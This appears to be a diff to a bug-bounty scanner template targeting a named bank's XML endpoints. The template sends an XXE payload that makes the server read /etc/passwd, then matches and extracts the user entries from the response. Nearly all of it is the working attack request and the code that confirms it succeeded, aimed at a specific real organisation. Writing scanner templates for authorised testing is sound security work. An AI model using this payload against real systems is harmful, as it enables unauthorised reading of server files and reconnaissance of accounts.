@@ -4,33 +4,49 @@ info:
   name: Alfabank - XXE via XML Endpoints
   author: bugbounty
   severity: high
-  description: XML External Entity injection
+  description: XML External Entity injection with /etc/passwd extraction
   tags: xxe,alfabank
+  reference:
+    - https://portswigger.net/web-security/xxe
 
 http:
   - raw:
       - |
-        GET /0.2/export/atm?mode=xml HTTP/1.1
-        Host: {{Hostname}}
-
-      - |
         POST /_/_currency.xml HTTP/1.1
         Host: {{Hostname}}
         Content-Type: application/xml
+        Accept: application/xml,text/xml
 
         <?xml version="1.0"?>
         <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
         <root>&xxe;</root>
 
-    matchers-condition: or
+    matchers-condition: and
     matchers:
       - type: regex
-        regex:
-          - "root:.*:0:0:"
+        name: passwd-file
         part: body
+        regex:
+          - "root:[x*]:0:0:"
+          - "bin:[x*]:[0-9]+:[0-9]+:"
+        condition: or
 
       - type: word
+        part: content_type
         words:
-          - "ENTITY"
-          - "DOCTYPE"
+          - "xml"
+          - "text/plain"
+        condition: or
+
+      - type: dsl
+        dsl:
+          - 'len(body) > 100'
+          - 'status_code == 200'
+        condition: and
+
+    extractors:
+      - type: regex
+        name: extracted_users
         part: body
+        regex:
+          - "([a-z_][a-z0-9_-]*):([x*]):([0-9]+):([0-9]+):"
